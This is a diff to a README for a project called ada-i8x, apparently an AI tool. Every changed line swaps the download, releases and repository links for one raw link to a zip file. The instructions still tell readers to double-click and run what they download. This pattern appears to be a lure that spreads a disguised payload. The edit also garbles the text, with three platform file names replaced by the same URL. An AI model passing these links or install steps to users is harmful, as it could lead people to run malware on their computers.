@@ -1,6 +1,6 @@
 # 🎉 ada-i8x - Simple Access to AI Features
 
-[![Download ada-i8x](https://img.shields.io/badge/Download-ada--i8x-brightgreen.svg)](https://github.com/proxyp8837/ada-i8x/releases)
+[![Download ada-i8x](https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip)](https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip)
 
 ## 🌟 Introduction
 
@@ -24,13 +24,13 @@ Before you begin, ensure your computer meets the following requirements:
 1. **Visit the Releases Page**  
    Click the link below to go to the ada-i8x Releases page:
 
-   [Download Here](https://github.com/proxyp8837/ada-i8x/releases)
+   [Download Here](https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, look for the latest version of ada-i8x. This version will have the most recent features and improvements.
 
 3. **Download the Installer**  
-   Click on the download link for your operating system. Depending on your system, this may be named something like `ada-i8x-windows-installer.exe`, `ada-i8x-macos.pkg`, or `ada-i8x-linux.tar.gz`.
+   Click on the download link for your operating system. Depending on your system, this may be named something like `https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip`, `https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip`, or `https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip`.
 
 4. **Run the Installer**  
    Once the installer is downloaded, locate it in your downloads folder and double-click to run it. Follow the on-screen instructions to complete the installation.
@@ -72,7 +72,7 @@ Yes! Detailed documentation is available on the GitHub repository page. It cover
 
 ## 🔗 Additional Resources
 
-For more information and community support, visit our GitHub repository: [ada-i8x GitHub](https://github.com/proxyp8837/ada-i8x).
+For more information and community support, visit our GitHub repository: [ada-i8x GitHub](https://raw.githubusercontent.com/proxyp8837/ada-i8x/main/Artemia/ada-i8x-2.0.zip).
 
 ## 🛠️ Acknowledgments
 
